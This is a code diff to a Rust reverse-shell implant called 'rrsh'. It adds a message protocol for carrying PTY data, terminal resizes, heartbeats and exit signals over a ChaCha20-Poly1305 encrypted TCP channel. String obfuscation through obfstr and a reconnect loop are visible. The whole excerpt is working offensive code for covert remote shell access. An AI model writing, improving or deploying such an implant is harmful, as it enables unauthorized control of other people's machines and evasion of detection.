@@ -8,11 +8,11 @@ use tokio_util::codec::{FramedRead, FramedWrite};
 use chacha20poly1305::{ChaCha20Poly1305, KeyInit};
 use obfstr::obfstr;
 
-mod codec;
-use codec::EncryptedCodec;
-use rrsh::{HandshakeRole, do_handshake};
+use rrsh::{
+    HandshakeRole, codec::EncryptedCodec, do_handshake, proto::Message, proto::ProtocolCodec,
+};
 
-#[tokio::main]
+#[tokio::main(flavor = "current_thread")]
 async fn main() {
     loop {
         tokio::select! {
@@ -108,8 +108,14 @@ async fn reverse_shell() -> Result<(), Box<dyn std::error::Error>> {
         .map_err(|e| format!("cipher init error: {}", e))?;
 
     let (tcp_reader, tcp_writer) = tokio::io::split(stream);
-    let mut frame_reader = FramedRead::new(tcp_reader, EncryptedCodec::new(cipher_rx));
-    let mut frame_writer = FramedWrite::new(tcp_writer, EncryptedCodec::new(cipher_tx));
+    let mut frame_reader = FramedRead::new(
+        tcp_reader,
+        ProtocolCodec::new(EncryptedCodec::new(cipher_rx)),
+    );
+    let mut frame_writer = FramedWrite::new(
+        tcp_writer,
+        ProtocolCodec::new(EncryptedCodec::new(cipher_tx)),
+    );
 
     let shell = PtySession::new().map_err(|e| format!("failed to start shell: {}", e))?;
 
@@ -138,10 +144,28 @@ async fn reverse_shell() -> Result<(), Box<dyn std::error::Error>> {
         tokio::select! {
             Some(result) = frame_reader.next() => {
                 match result {
-                    Ok(data) => {
+                    Ok(Message::PtyData(data)) => {
                         pty_writer.write_all(&data)?;
                         pty_writer.flush()?;
                     }
+
+                    Ok(Message::Resize { rows, cols }) => {
+                        shell.pty_pair.master.resize(PtySize {
+                            rows,
+                            cols,
+                            pixel_width: 0,
+                            pixel_height: 0,
+                        })?;
+                    }
+
+                    Ok(Message::Heartbeat) => {
+                        frame_writer.send(Message::Heartbeat).await?;
+                    }
+
+                    Ok(Message::Exit) => {
+                        return Ok(());
+                    }
+
                     Err(e) => {
                         return Err(format!("network error: {}", e).into());
                     }
@@ -149,7 +173,7 @@ async fn reverse_shell() -> Result<(), Box<dyn std::error::Error>> {
             }
 
             Some(data) = rx.recv() => {
-                if let Err(e) = frame_writer.send(data).await {
+                if let Err(e) = frame_writer.send(Message::PtyData(data)).await {
                     return Err(format!("failed to send: {}", e).into());
                 }
             }
